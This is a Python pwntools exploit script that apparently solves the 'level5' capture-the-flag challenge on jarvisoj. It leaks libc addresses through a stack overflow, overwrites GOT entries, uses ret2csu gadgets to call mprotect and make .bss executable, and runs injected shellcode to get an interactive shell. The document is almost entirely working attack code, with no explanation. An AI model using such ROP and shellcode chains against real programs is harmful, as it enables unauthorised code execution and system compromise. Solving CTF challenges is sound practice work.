#!/usr/bin/env python
# -*-coding=utf-8-*-
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = process("./level5")
io = remote("pwn2.jarvisoj.com",9884)
libc = ELF("./libc-2.19.so")
elf = ELF("./level5")

# gdb.attach(io,"b * 0x400613")
# plt and got and libc for ready
write_plt = elf.plt["write"]
write_got = elf.got["write"]
read_plt = elf.plt["read"]
write_libc = libc.symbols["write"]
mprotect_libc = libc.symbols["mprotect"]
bss = 0x600a88
start = elf.symbols["main"]

# universe gadgets
pop_rbx_r15_ret = 0x4006aa
mov_rdx_call_r12 = 0x400690

def universe_gadgets(payload,arg1,arg2,arg3,call):
    payload += p64(pop_rbx_r15_ret)
    payload += p64(0) + p64(1)
    payload += p64(call) + p64(arg3) + p64(arg2) + p64(arg1)
    payload += p64(mov_rdx_call_r12)
    payload += 7 * p64(0xdeadbeef)
    return payload

'''
# leak the address of mprotect
payload = 'a' * (0x80 + 0x8)
payload = universe_gadgets(payload,1,write_got,8,write_plt)
payload += p64(start)
'''

# leak the address of mprotect
rdi_ret = 0x4006B3
rsi_ret = 0x4006B1
payload = 'a' * 0x88
payload += p64(rdi_ret) + p64(1)
payload += p64(rsi_ret) + p64(write_got) + p64(0xdeadbeef)
payload += p64(write_plt) + p64(start)
io.recvuntil("put:\n")
io.send(payload)
write_addr = u64(io.recv(8))
mprotect_addr = write_addr - write_libc + mprotect_libc
print "mprotect_addr ->> " + hex(mprotect_addr)

# read the shellcode into bss
payload = 'a' * 0x88
payload += p64(rdi_ret) + p64(0)
payload += p64(rsi_ret) + p64(bss) + p64(0xdeadbeef)
payload += p64(read_plt) + p64(start)
shellcode = asm(shellcraft.amd64.sh())
io.recvuntil("put:\n")
io.send(payload)
io.send(shellcode + '\0')
print "read over"

# read the mprotect_addr to __gmon_start__
gmon = 0x600a70
payload = 'a' * 0x88
payload += p64(rdi_ret)
payload += p64(0)
payload += p64(rsi_ret) + p64(gmon) + p64(0xdeadbeef)
payload += p64(read_plt) + p64(start)
io.recvuntil("put:\n")
io.send(payload)
io.send(p64(mprotect_addr))
print 'f**k ok'

# change bss into 'rwx' with mprotect
payload = 'a' * 0x88
payload = universe_gadgets(payload,0x600000,0x1000,7,gmon)
payload += p64(start)
io.recvuntil("put:\n")
io.send(payload)
print "change successfully"

# read the bss to __libc_start_main
libc_start = 0x600a68
payload = 'a' * 0x88
payload += p64(rdi_ret)
payload += p64(0)
payload += p64(rsi_ret) + p64(libc_start) + p64(0xdeadbeef)
payload += p64(read_plt) + p64(start)
io.recvuntil("put:\n")
io.send(payload)
io.send(p64(bss))

# execv the shellcode
payload = 'a' * 0x88
payload += p64(libc_start) + p64(libc_start)
io.recvuntil("put:\n")
io.send(payload)

io.interactive()
io.close()
